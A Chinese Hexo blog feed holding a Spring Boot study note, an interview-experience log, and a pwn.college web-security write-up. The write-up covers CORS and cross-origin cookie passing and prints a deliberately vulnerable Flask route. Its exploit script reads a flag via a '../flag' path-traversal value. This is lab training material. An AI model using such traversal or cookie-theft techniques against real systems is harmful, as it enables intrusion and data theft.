应用上下文（<code>ApplicationContext</code>），并自动扫描、加载所有的 bean、配置类和组件。</p></li></ul><h5 id="2-组件的自动扫描和依赖注入"><a href="#2-组件的自动扫描和依赖注入" class="headerlink" title="2. 组件的自动扫描和依赖注入"></a>2. <strong>组件的自动扫描和依赖注入</strong></h5><ul><li><strong>组件扫描（<code>@ComponentScan</code>）</strong>：当启动类启动时，<code>@ComponentScan</code> 会扫描当前包及其子包下的所有类，找到标记了 Spring 注解的类（如 <code>@Controller</code>, <code>@Service</code>, <code>@Repository</code>, <code>@Component</code>），并将这些类注册为 Spring 管理的 bean。</li><li>依赖注入（DI，Dependency Injection）：Spring 会通过依赖注入的方式，将需要的组件注入到其他组件中。例如，Controller 类中的 Service 实例，Service类中的 Repository实例，都是通过构造函数或字段注入的。<ul><li><strong><code>@Autowired</code> 注解</strong>：用于告诉 Spring 自动注入依赖。</li></ul></li></ul><h5 id="3-模块之间的启动与协作"><a href="#3-模块之间的启动与协作" class="headerlink" title="3. 模块之间的启动与协作"></a>3. <strong>模块之间的启动与协作</strong></h5><ul><li>Controller 层与 Service 层的交互：<ul><li><code>Controller</code> 是处理 HTTP 请求的入口，它接收客户端请求并返回响应。</li><li>在 <code>Controller</code> 中，通常通过依赖注入（如 <code>@Autowired</code>）的方式，调用业务逻辑层的 <code>Service</code> 类。例如，一个 <code>UserController</code> 可能会注入 <code>UserService</code>，调用其方法来处理与用户相关的业务逻辑。</li></ul></li><li>Service 层与 Mapper 层的交互：<ul><li><code>Service</code> 是业务逻辑的核心层，它处理具体的业务规则和流程。</li><li>如果需要访问数据库，<code>Service</code> 会通过依赖注入调用 <code>Mapper</code> 类（通常是接口，使用 <code>@Mapper</code> 注解）。<code>Mapper</code> 使用数据库访问框架（如 MyBatis、JPA）来进行增删改查操作，返回的数据会交给 <code>Service</code> 层处理后返回给 <code>Controller</code>。</li></ul></li><li>Service 层与其他 Service 层的交互：<ul><li>一个服务可能会依赖于其他服务。例如，订单服务 <code>OrderService</code> 可能需要调用用户服务 <code>UserService</code> 获取用户信息。这也是通过依赖注入完成的。</li></ul></li></ul><h5 id="4-数据处理流程"><a href="#4-数据处理流程" class="headerlink" title="4. 数据处理流程"></a>4. <strong>数据处理流程</strong></h5><ul><li>请求流程：<ul><li>当一个 HTTP 请求发出时，<code>DispatcherServlet</code> 作为 Spring MVC 的核心控制器，首先拦截请求，然后根据 URL 路径找到对应的 <code>Controller</code>，并将请求转发给相应的方法处理。</li><li><code>Controller</code> 方法会处理请求参数，并通过调用 <code>Service</code> 来执行具体的业务逻辑。</li></ul></li><li>业务逻辑处理：<ul><li><code>Service</code> 负责处理业务逻辑，通常通过注入 <code>Mapper</code> 类与数据库交互，获取或保存数据。</li></ul></li><li>数据返回：<ul><li><code>Service</code> 将处理后的数据返回给 <code>Controller</code>，<code>Controller</code> 再将数据封装成 JSON、XML 或视图等形式，返回给客户端。</li></ul></li></ul><h5 id="5-Spring-Security-或-Realm-的认证流程"><a href="#5-Spring-Security-或-Realm-的认证流程" class="headerlink" title="5. Spring Security 或 Realm 的认证流程"></a>5. <strong>Spring Security 或 Realm 的认证流程</strong></h5><ul><li>如果项目中包含安全模块（如 <code>realm</code> 目录），Spring Boot 可能会集成 Spring Security 或 Shiro 进行用户认证与授权。</li><li>当用户访问受保护的资源时，<code>Realm</code> 类（用于身份验证的组件）会被调用，通过查询数据库或其他用户数据源，验证用户身份，并检查权限。</li><li>验证通过后，Spring Security 会允许请求继续，进入 <code>Controller</code> 处理业务逻辑；否则，用户将被重定向到登录页面或显示未授权的错误信息。</li></ul><h5 id="6-配置类的作用"><a href="#6-配置类的作用" class="headerlink" title="6. 配置类的作用"></a>6. <strong>配置类的作用</strong></h5><ul><li><code>config</code> 目录下的配置类会在项目启动时由 Spring 自动加载，并根据项目的需求，配置必要的 bean。</li><li>例如，安全配置类可以定义哪些 URL 需要认证、哪些请求不需要认证；数据源配置类会定义数据库连接的细节；跨域配置类会设置哪些域名可以访问此应用的资源等。</li></ul><h5 id="7-测试的启动"><a href="#7-测试的启动" class="headerlink" title="7. 测试的启动"></a>7. <strong>测试的启动</strong></h5><ul><li>测试类通常位于 <code>test</code> 目录下。通过 <code>@SpringBootTest</code> 注解，测试类可以启动一个 Spring 上下文，用于进行集成测试，确保各个模块的正确交互和功能。</li></ul><h5 id="8-主线程与子线程"><a href="#8-主线程与子线程" class="headerlink" title="8. 主线程与子线程"></a>8. <strong>主线程与子线程</strong></h5><ul><li>Spring Boot 项目默认在主线程中启动。但如果项目中有异步任务、定时任务等，可能会启动多个子线程来并行处理。</li><li>例如，通过 <code>@Async</code> 注解，Spring 可以启用异步任务，在后台线程中执行不会阻塞主线程的操作。</li></ul><hr><h5 id="总结：-3"><a href="#总结：-3" class="headerlink" title="总结："></a>总结：</h5><ol><li><strong>启动类</strong>：通过 <code>@SpringBootApplication</code> 自动扫描和启动项目。</li><li><strong>组件扫描</strong>：扫描并注册所有 Spring 管理的组件（Controller、Service、Repository 等）。</li><li><strong>依赖注入</strong>：不同层（Controller、Service、Mapper）之间通过依赖注入协作处理业务。</li><li><strong>请求处理</strong>：客户端请求经由 <code>Controller</code> 调用 <code>Service</code>，最终访问 <code>Mapper</code> 执行数据库操作。</li><li><strong>认证授权</strong>：通过 Spring Security 或 Shiro 进行安全控制。</li><li><strong>配置类与测试类</strong>：配置类定义应用的各种设置，测试类用于验证功能。</li></ol><p>项目启动的核心机制是 <strong>Spring Boot 的自动配置</strong> 和 <strong>依赖注入</strong>，它们确保了各个模块能够自动协作和启动。</p><h4 id="10-Java什么情况下会产生内存溢出"><a href="#10-Java什么情况下会产生内存溢出" class="headerlink" title="10. Java什么情况下会产生内存溢出"></a>10. Java什么情况下会产生内存溢出</h4><ul><li>堆溢出，不断的声明新的对象实例</li><li>虚拟机栈和本地方法栈溢出，线程请求的栈深度大于虚拟机所允许的最大深度、扩展栈容量无法申请到足够的内存。</li><li>方法区和运行时常量池溢出，一直创建字符串，使得字符串常量池溢出</li><li>本机的内存溢出，excel表中的数据太多，无法完全放到内存中，如果你要一起读出全部的数据，会发生内存溢出</li></ul><h4 id=""><a href="#" class="headerlink" title=""></a></h4>]]></content>
      
      
      <categories>
          
          <category> 学习 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 常见知识 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>求职之路-面经</title>
      <link href="/2024/07/09/qiu-zhi-zhi-lu-mian-jing/"/>
      <url>/2024/07/09/qiu-zhi-zhi-lu-mian-jing/</url>
      
        <content type="html"><![CDATA[<h1 id="求职之路"><a href="#求职之路" class="headerlink" title="求职之路"></a>求职之路</h1><h2 id="1-百度-开发测试-北京"><a href="#1-百度-开发测试-北京" class="headerlink" title="1. 百度 开发测试 北京"></a>1. 百度 开发测试 北京</h2><hr><h3 id="一面"><a href="#一面" class="headerlink" title="一面"></a>一面</h3><p>一面时间   0715  16:00 - 17:00</p><p>问题：</p><ol><li>python浅拷贝和深拷贝的区别？</li><li>python list 和 元组的区别？</li><li>java中如何实现多线程？</li><li>java中常用的第三方包？</li><li>统计不同班级成绩不合格的人数。SQL指令</li><li>如果每页有10条数据，如何查询第10000页的数据。SQL指令</li><li>查询薪水在前三的数据。SQL指令</li><li>手写代码，data[“-“,”+”,”+”,”-“,”-“,”-“,”-“]把所有的+号排在左边，-号排在右边。虽然写出来了，但是代码跟屎一样。</li><li>挑个一个最近的项目介绍。说一下在项目中遇到的问题？</li><li>你如何对百度搜索这个功能进行测试？</li><li>常用的linux命令</li><li>如何截取日志文件中的第10-20的内容并显示。</li><li>如何查询linux中目前占用8080端口的进行，并杀死它。</li></ol><p>反问：</p><ol><li>开发测试岗常用到的技术？<br>常用的语言python、 shell、 SQL、 go<br>测试的目标包括：百度内部的产品，可能是c++、java写的。最起码得能看懂。</li><li>开发测试岗的工作场景？<br>对接百度产品线，对产品进行功能测试、代码测试等。</li><li>开发、测试、算法之间的区别？<br>测试用的算法比较少。开发测试还要涉及到一些测试工具的开发。</li></ol><h3 id="二面-—挂"><a href="#二面-—挂" class="headerlink" title="二面 —挂"></a>二面 —挂</h3><p>二面时间   0718  14:00 - 15:13</p><p>问题:</p><ol><li>介绍项目1</li><li>介绍项目2</li><li>介绍死锁，死锁的几种条件？</li><li>数据库索引有几种类型？索引的优缺点？</li><li>sql，如何返回一个表中至少出现3次以上的数，想要找出那些在任意一条记录中至少出现3次的数。？</li><li>浏览器输入url到返回页面数据经历了哪些过程？</li><li>Redis雪崩，如何避免？</li><li>常见的大模型这些了解吗？</li><li>session 和 cookie 的区别？</li><li>python 装饰器</li><li>python中可变变量发生改变时，变量的内存地址会发生改变吗？不可变变量呢？</li><li>微信点赞的测试用例？</li><li>写了一道简单的算法题—-结果无限循环。。。</li></ol><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token comment">#!/usr/bin/python</span><span class="token comment"># -*- coding: UTF-8 -*-</span><span class="token keyword">def</span> <span class="token function">max_sub_str</span><span class="token punctuation">(</span>in_str<span class="token punctuation">)</span><span class="token punctuation">:</span>   n <span class="token operator">=</span> <span class="token builtin">len</span><span class="token punctuation">(</span>in_str<span class="token punctuation">)</span>   <span class="token keyword">if</span> n <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">:</span>      <span class="token keyword">return</span> <span class="token number">0</span>   res <span class="token operator">=</span> <span class="token number">0</span> <span class="token comment"># 这个最小的值应该是1</span>   start <span class="token operator">=</span> <span class="token number">0</span>   <span class="token keyword">while</span> start <span class="token operator">&lt;</span> n<span class="token punctuation">:</span> <span class="token comment"># 这里终止条件应该写成n-1，开启的位置如果到了最后一个位置，没必要进行了。因为最小的字符长度就是1</span>      sub_str <span class="token operator">=</span> <span class="token string">""</span>      <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span>start<span class="token punctuation">,</span> n<span class="token punctuation">)</span><span class="token punctuation">:</span>         <span class="token keyword">if</span> in_str<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token keyword">not</span> <span class="token keyword">in</span> sub_str<span class="token punctuation">:</span>            sub_str <span class="token operator">+=</span> in_str<span class="token punctuation">[</span>i<span class="token punctuation">]</span>         <span class="token keyword">else</span><span class="token punctuation">:</span>            res <span class="token operator">=</span> <span class="token builtin">max</span><span class="token punctuation">(</span>res<span class="token punctuation">,</span> <span class="token builtin">len</span><span class="token punctuation">(</span>sub_str<span class="token punctuation">)</span><span class="token punctuation">)</span>            start <span class="token operator">=</span> i <span class="token comment"># 这里应该写成start += 1</span>            <span class="token keyword">break</span>   <span class="token keyword">return</span> ress<span class="token operator">=</span><span class="token string">"abcabcbb"</span>res<span class="token operator">=</span>max_sub_str<span class="token punctuation">(</span>s<span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>res<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>反问：</p><ol><li>开发测试一天的工作流程是什么样子的？</li></ol><p>每个同学可能不一样，一部分工作是要对接百度的产品线，另一部分的工作会有一些开发任务的topic。</p><ol start="2"><li>开发测试岗属于一个部门还是一个组？</li></ol><p>开发测试是一个大的部门，下面有很多个组，不同组之间可能会有一些协同的测试任务，但一般情况下是针对不同类型的产品进行测试。</p><hr><p>上次这个挂了</p><h3 id="重回一面-—-再挂"><a href="#重回一面-—-再挂" class="headerlink" title="重回一面 —-再挂"></a>重回一面 —-再挂</h3><p>0729  16:00 - 17:00</p><p>就记技术问题了，其他的情商的掠过。</p><ol><li>java中的堆空间和栈空间有什么区别？</li><li>python 中is 和 == 的区别？</li><li>微信视频怎么测试？</li><li>有一个整数数组，其中只有两个数字只出现了一次，其他数字均出现了两次，找出这两个数字。</li><li>HTTP中get请求和Post请求的区别</li></ol><h2 id="2-字节-AI测试开发工程师-—"><a href="#2-字节-AI测试开发工程师-—" class="headerlink" title="2. 字节 AI测试开发工程师 —-"></a>2. 字节 AI测试开发工程师 —-</h2><h3 id="一面-2024-0815-15-00-16-00-挂-0823"><a href="#一面-2024-0815-15-00-16-00-挂-0823" class="headerlink" title="一面  2024.0815  15:00-16:00   挂 0823"></a>一面  2024.0815  15:00-16:00   挂 0823</h3><ol><li>自我介绍</li><li>拷打项目</li><li>死锁</li><li>DNS服务器</li><li>常见的HTTP状态码</li><li>GET和POST方法区别</li><li>常用的linux指令—ps指令能看到的信息啥的</li><li>数据库查表 —<strong>这一块还是比较欠缺</strong>。</li><li>索引的类型以以及优缺点。</li><li>如果一个网站访问速度比较慢，从开发者的角度你会从哪些地方开始排查？</li><li>请针对购物车功能设计测试用例？</li><li>快速排序。<strong>没写出来</strong>  ┭┮﹏┭┮</li></ol><h2 id="3-腾讯-测试开发"><a href="#3-腾讯-测试开发" class="headerlink" title="3. 腾讯 测试开发"></a>3. 腾讯 测试开发</h2><h3 id="一面-2024-0823-11：00-12：00"><a href="#一面-2024-0823-11：00-12：00" class="headerlink" title="一面 2024.0823  11：00- 12：00"></a>一面 2024.0823  11：00- 12：00</h3><p>北极光工作室</p><ul><li>python写一个简易的 生产者消费者模型，，没写出来</li><li>0-1背包问题，代码没写出来</li></ul><p>估计是又挂了</p><h2 id="4-快手-测试开发工程师"><a href="#4-快手-测试开发工程师" class="headerlink" title="4. 快手 测试开发工程师"></a>4. 快手 测试开发工程师</h2><h3 id="一面-—-2024-0820"><a href="#一面-—-2024-0820" class="headerlink" title="一面 — 2024.0820"></a>一面 — 2024.0820</h3><p>具体问题忘了，但是回答问题的逻辑性要注意一下。按照总分的思路讲解，分步讲解的时候，记得按照先说关键词，然后再详细解释含义。</p><h3 id="二面-—-2024-0826"><a href="#二面-—-2024-0826" class="headerlink" title="二面 — 2024.0826"></a>二面 — 2024.0826</h3><p>这次面试官给人的印象很好，每个问题都是结合具体的场景。</p><ul><li>设计一个订单号，要求订单号不重复</li></ul><h3 id="三面-—-2024-0829"><a href="#三面-—-2024-0829" class="headerlink" title="三面 — 2024.0829"></a>三面 — 2024.0829</h3><ul><li>有两个栈，一个栈A[1-&gt;N]，另一个栈B[], 和一个临时变量，要求反转栈A中的所有元素。</li><li>一个生成器G1(0:p, 1:1-p)生成0的概率是p，生成1的概率是1-p, 要求已知生成器G1， 生成G2(0:0.5, 1:0.5)。</li><li>有几十亿条短视频数据，如何找到播放量在前十的数据。</li><li>TCP的三次握手和四次挥手，客户端如何分别多个连接请求。</li></ul><h2 id="5-美团-安全工程师"><a href="#5-美团-安全工程师" class="headerlink" title="5. 美团 安全工程师"></a>5. 美团 安全工程师</h2><h3 id="简历挂—2024-0823"><a href="#简历挂—2024-0823" class="headerlink" title="简历挂—2024.0823"></a>简历挂—2024.0823</h3><h2 id="6-美团-测试开发工程师"><a href="#6-美团-测试开发工程师" class="headerlink" title="6. 美团 测试开发工程师"></a>6. 美团 测试开发工程师</h2><h3 id="一面-—-20240828-19-00"><a href="#一面-—-20240828-19-00" class="headerlink" title="一面 — 20240828 19: 00"></a>一面 — 20240828 19: 00</h3><h2 id="7-京东-测试开发工程师"><a href="#7-京东-测试开发工程师" class="headerlink" title="7. 京东 测试开发工程师"></a>7. 京东 测试开发工程师</h2><h3 id="一面-2024-09-03"><a href="#一面-2024-09-03" class="headerlink" title="一面  2024.09.03"></a>一面  2024.09.03</h3><p>京东健康-技术产品部</p><h2 id="8"><a href="#8" class="headerlink" title="8."></a>8.</h2>]]></content>
      
      
      <categories>
          
          <category> 求职 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 面经 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>PWN-College-WebSecurity-Writeup</title>
      <link href="/2024/07/08/pwn-college-websecurity-writeup/"/>
      <url>/2024/07/08/pwn-college-websecurity-writeup/</url>
      
        <content type="html"><![CDATA[<h1 id="pwn-college"><a href="#pwn-college" class="headerlink" title="pwn.college"></a>pwn.college</h1><p><a href="https://pwn.college/intro-to-cybersecurity/web-security/">https://pwn.college/intro-to-cybersecurity/web-security/</a></p><h2 id="有价值的问题"><a href="#有价值的问题" class="headerlink" title="有价值的问题"></a>有价值的问题</h2><h3 id="1-重定向和直接请求的区别？"><a href="#1-重定向和直接请求的区别？" class="headerlink" title="1. 重定向和直接请求的区别？"></a>1. 重定向和直接请求的区别？</h3><ul><li><p>Flask 重定向处理：<br>Flask 的 redirect 函数是 HTTP 协议中的一个特性，它向浏览器发送一个 302 响应码，并告诉浏览器去访问另一个 URL。这和直接在服务器端发送一个请求是有区别的。使用 redirect 是让客户端（如浏览器）去访问新的 URL，而不是服务器端发起请求。</p></li><li><p>直接请求和重定向的区别：<br>如果你直接在服务器端重新发送请求，需要使用 requests 库来实现，而不是使用 Flask 的 redirect 函数。重定向是让浏览器去访问新的 URL，而直接请求则是服务器端自己去访问 URL 并处理响应。</p></li></ul><h3 id="2-为什么提交表单的形式不会出现跨域的问题？"><a href="#2-为什么提交表单的形式不会出现跨域的问题？" class="headerlink" title="2. 为什么提交表单的形式不会出现跨域的问题？"></a>2. 为什么提交表单的形式不会出现跨域的问题？</h3><p>跨域问题（CORS, Cross-Origin Resource Sharing）主要与浏览器的同源策略有关。浏览器默认会阻止一个域名的网页通过脚本（例如JavaScript）与另一个域名的服务器进行交互，除非目标服务器明确允许这种行为。以下是两种情况的详细解释：</p><ul><li>使用 JavaScript 处理重定向<br>当你使用 JavaScript 来发送跨域请求时，例如使用 fetch 或 XMLHttpRequest，浏览器会触发 CORS 检查。跨域请求会受到以下限制：</li></ul><ol><li>预检请求：对于某些类型的请求（例如带有自定义头部或使用非简单方法如 POST、PUT 等），浏览器会先发送一个 OPTIONS 请求来“预检”服务器是否允许该请求。如果服务器响应不允许，实际的请求将不会被发送。</li><li>响应头部要求：目标服务器需要在响应中设置适当的 CORS 头部，例如 Access-Control-Allow-Origin，以指示允许的跨域来源。<br>如果没有正确处理 CORS 头部，浏览器将会阻止请求并抛出跨域错误。</li></ol><ul><li>使用表单提交<br>当你使用 HTML 表单提交（例如通过 <form> 标签），浏览器的行为有所不同：</li></ul><ol><li>表单提交是“简单请求”：HTML 表单提交被视为“简单请求”，因为它们不带有复杂的 HTTP 头部，并且使用的方法（如 GET、POST）也被视为简单方法。</li><li>浏览器不进行预检请求：由于表单提交是简单请求，浏览器不会进行预检请求（OPTIONS），因此不会触发跨域检查。</li><li>重定向处理：在表单提交的情况下，如果目标服务器返回重定向（例如 302 重定向），浏览器会自动处理重定向，而不涉及跨域问题。<pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript">具体示例JavaScript 跨域请求示例复制代码<span class="token function">fetch</span><span class="token punctuation">(</span><span class="token string">'http://example.com/api'</span><span class="token punctuation">,</span> <span class="token punctuation">&#123;</span>   <span class="token literal-property property">method</span><span class="token operator">:</span> <span class="token string">'POST'</span><span class="token punctuation">,</span>   <span class="token literal-property property">headers</span><span class="token operator">:</span> <span class="token punctuation">&#123;</span> <span class="token string-property property">'Content-Type'</span><span class="token operator">:</span> <span class="token string">'application/json'</span> <span class="token punctuation">&#125;</span><span class="token punctuation">,</span>  <span class="token literal-property property">body</span><span class="token operator">:</span> <span class="token constant">JSON</span><span class="token punctuation">.</span><span class="token function">stringify</span><span class="token punctuation">(</span><span class="token punctuation">&#123;</span> <span class="token literal-property property">key</span><span class="token operator">:</span> <span class="token string">'value'</span> <span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">then</span><span class="token punctuation">(</span><span class="token parameter">response</span> <span class="token operator">=></span> response<span class="token punctuation">.</span><span class="token function">json</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">then</span><span class="token punctuation">(</span><span class="token parameter">data</span> <span class="token operator">=></span> console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>data<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">catch</span><span class="token punctuation">(</span><span class="token parameter">error</span> <span class="token operator">=></span> console<span class="token punctuation">.</span><span class="token function">error</span><span class="token punctuation">(</span><span class="token string">'Error:'</span><span class="token punctuation">,</span> error<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>如果 http<span class="token operator">:</span><span class="token operator">/</span><span class="token operator">/</span>example<span class="token punctuation">.</span>com 服务器没有正确设置 <span class="token constant">CORS</span> 头部，这个请求会被浏览器阻止，并抛出跨域错误。表单提交示例html复制代码<span class="token operator">&lt;</span>form action<span class="token operator">=</span><span class="token string">"http://example.com/api"</span> method<span class="token operator">=</span><span class="token string">"POST"</span><span class="token operator">></span>  <span class="token operator">&lt;</span>input type<span class="token operator">=</span><span class="token string">"hidden"</span> name<span class="token operator">=</span><span class="token string">"key"</span> value<span class="token operator">=</span><span class="token string">"value"</span><span class="token operator">></span>  <span class="token operator">&lt;</span>input type<span class="token operator">=</span><span class="token string">"submit"</span> value<span class="token operator">=</span><span class="token string">"Submit"</span><span class="token operator">></span><span class="token operator">&lt;</span><span class="token operator">/</span>form<span class="token operator">></span>浏览器会直接提交表单到 http<span class="token operator">:</span><span class="token operator">/</span><span class="token operator">/</span>example<span class="token punctuation">.</span>com<span class="token operator">/</span>api，即使是跨域请求，也不会受到 <span class="token constant">CORS</span> 限制。<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li></ol><ul><li>总结<br>JavaScript 处理重定向时出现跨域问题：因为浏览器会进行 CORS 检查，并需要服务器正确设置 CORS 头部。表单提交没有跨域问题：因为表单提交被视为简单请求，浏览器不会进行预检请求，也不涉及复杂的头部设置。这就是为什么使用表单提交时不会出现跨域问题，而使用 JavaScript 处理重定向时可能会遇到跨域问题的原因。</li></ul><p>表单提交请求被算作是简单请求的原因。表单提交的请求算作是“简单请求”的原因在于，HTTP 规范和浏览器的同源策略定义了哪些请求类型可以被认为是“简单请求”。具体来说，简单请求是指符合某些条件的HTTP请求，这些条件使得请求被认为是不会对服务器或数据安全性构成重大风险。</p><ul><li>什么是简单请求<ul><li>根据 CORS 规范，一个HTTP请求被认为是“简单请求”，必须满足以下条件：</li></ul></li></ul><ol><li>请求方法：</li></ol><ul><li>仅限于 GET、HEAD 或 POST。</li><li>HTTP 头部：</li></ul><ol start="2"><li>请求中所使用的头部字段仅限于以下几种不自定义的标准字段：</li></ol><ul><li>Accept</li><li>Accept-Language</li><li>Content-Language</li><li>Content-Type（但仅限于 text/plain, multipart/form-data, 或 application/x-www-form-urlencoded）</li></ul><ol start="3"><li>如果使用 POST 方法，请求的 Content-Type 头部必须是以下之一：</li></ol><ul><li>text/plain</li><li>multipart/form-data</li><li>application/x-www-form-urlencoded</li></ul><p>这些限制条件确保了请求的内容和头部都是简单且安全的，不会对服务器构成跨站点脚本攻击（XSS）或其他潜在的威胁。</p><h3 id="3-level13中学习到的"><a href="#3-level13中学习到的" class="headerlink" title="3. level13中学习到的"></a>3. level13中学习到的</h3><h4 id="3-1"><a href="#3-1" class="headerlink" title="3.1"></a>3.1</h4><p>URL编码的过程中，有可能把空格编码成+，这样的话，如果你的xss payload中包含空格，会导致xss payload无法正确被解析。还是要把他编码为%20比较保险。具体可以看这个连接中的例子。<a href="https://www.w3schools.com/tags/ref_urlencode.ASP">https://www.w3schools.com/tags/ref_urlencode.ASP</a></p><h4 id="3-2"><a href="#3-2" class="headerlink" title="3.2"></a>3.2</h4><p><code>response.headers[&#39;Access-Control-Allow-Headers&#39;] = &#39;Content-Type, Authorization</code>。Access-Control-Allow-Headers 是一个 CORS（跨域资源共享）响应头，用于指定服务器允许客户端请求中使用的 HTTP 头字段。这个头字段在处理预检请求时特别重要，它告诉浏览器哪些自定义请求头是被服务器允许的。</p><p>也就是说，你自定义的请求头，只能设定的里面。如果不在，跨域请求不会成功。第一开始，我就一直没设置对，一直想着使用cookie字段传过去，然后response.headers[“Access-Control-Allow-Headers”]中也没设置Cookies所以一直没传过去。<br>当我设置Cookies之后，是可以传递过去的。</p><p><img src="https://laboratory-1304292449.cos.ap-nanjing.myqcloud.com/note/20240707103454.png" alt="20240707103454"></p><p>然后hacker那边也可以正确接收。</p><p><img src="https://laboratory-1304292449.cos.ap-nanjing.myqcloud.com/note/20240707103717.png" alt="20240707103717"></p><h4 id="3-3-关于调试"><a href="#3-3-关于调试" class="headerlink" title="3.3 关于调试"></a>3.3 关于调试</h4><p>这些题目是我在本地进行调试之后才发现的解决方案。虽然这个过程不是真实的攻击环境，但秉承着学习知识的态度，这种方式确实最有效最节约时间的。以后卡住了，不要死扣，开始本地调试，然后发现之前卡住的原因才是最关键的。</p><h3 id="4-level15"><a href="#4-level15" class="headerlink" title="4. level15"></a>4. level15</h3><p>python中可以加载C语言的共享库，加载完成之后，C语言的共享库中的函数就可以像python函数一样进行调用。ctypes 是 Python 标准库中的一个模块，它提供了与 C 语言兼容的数据类型，并允许调用动态链接库（DLLs）或共享库（Shared Libraries）。ctypes 使得 Python 能够直接调用用 C 语言编写的库中的函数，这对需要高性能或特定平台功能的应用非常有用。</p><p>URL 参数中可以传递 Latin-1 编码的字符串，但需要对其进行 URL 编码以确保特殊字符不会导致传输问题。URL 编码将特殊字符转换为 % 后跟两个十六进制数字的形式。</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> requests<span class="token keyword">import</span> urllib<span class="token punctuation">.</span>parse<span class="token comment"># 假设你有一些包含 Latin-1 特殊字符的字符串</span>latin1_string <span class="token operator">=</span> <span class="token string">"Hello, World! åäö"</span><span class="token comment"># 将字符串编码为 Latin-1 字节串</span>latin1_encoded <span class="token operator">=</span> latin1_string<span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token string">'latin-1'</span><span class="token punctuation">)</span><span class="token comment"># 将字节串进行 URL 编码</span>url_encoded <span class="token operator">=</span> urllib<span class="token punctuation">.</span>parse<span class="token punctuation">.</span>quote_from_bytes<span class="token punctuation">(</span>latin1_encoded<span class="token punctuation">)</span><span class="token comment"># 发送带有 URL 编码数据的请求</span>url <span class="token operator">=</span> <span class="token string">"http://challenge.localhost:1555/greet"</span>params <span class="token operator">=</span> <span class="token punctuation">&#123;</span><span class="token string">"name"</span><span class="token punctuation">:</span> url_encoded<span class="token punctuation">&#125;</span>response <span class="token operator">=</span> requests<span class="token punctuation">.</span>get<span class="token punctuation">(</span>url<span class="token punctuation">,</span> params<span class="token operator">=</span>params<span class="token punctuation">)</span><span class="token comment"># 打印响应</span><span class="token keyword">print</span><span class="token punctuation">(</span>response<span class="token punctuation">.</span>text<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>对于字符串 “Hello, World! åäö”，Latin-1 编码后的字节串为：b’Hello, World! \xe5\xe4\xf6’</p><h2 id="level1"><a href="#level1" class="headerlink" title="level1"></a>level1</h2><p>源码</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">def</span> <span class="token function">level1</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    path <span class="token operator">=</span> request<span class="token punctuation">.</span>args<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">"path"</span><span class="token punctuation">)</span>    <span class="token keyword">assert</span> path<span class="token punctuation">,</span> <span class="token string">"Missing `path` argument"</span>    <span class="token keyword">return</span> <span class="token punctuation">(</span>pathlib<span class="token punctuation">.</span>Path<span class="token punctuation">(</span>app<span class="token punctuation">.</span>root_path<span class="token punctuation">)</span> <span class="token operator">/</span> path<span class="token punctuation">)</span><span class="token punctuation">.</span>read_text<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>利用脚本：</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token comment"># level 1 </span>headers <span class="token operator">=</span> <span class="token punctuation">&#123;</span>    <span class="token string">"host"</span><span class="token punctuation">:</span><span class="token string">'challenge.localhost'</span><span class="token punctuation">,</span><span class="token punctuation">&#125;</span>file_path <span class="token operator">=</span> <span class="token string">"../flag"</span>response <span class="token operator">=</span> requests<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">'http://challenge.localhost:80/'</span><span class="token punctuation">,</span> headers<span class="token operator">=</span>headers<span class="token punctuation">,</span> params<span class="token operator">=</span><span class="token punctuation">&#123;</span><span class="token string">"path"</span><span class="token punctuation">:</span> file_path<span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>response<span class="token punctuation">.</span>text<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="level2"><a href="#level2" class="headerlink" title="level2"></a>level2</h2><p>源码</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">def</span> <span class="token function">level2</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    timezone <span class="token operator">=</span> request<span class="token punctuation">.</span>args<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">"timezone"</span><span class="token punctuation">,</span> <span class="token string">"UTC"</span><span class="token punctuation">)</span>    <span class="token keyword">return</span> subprocess<span class="token 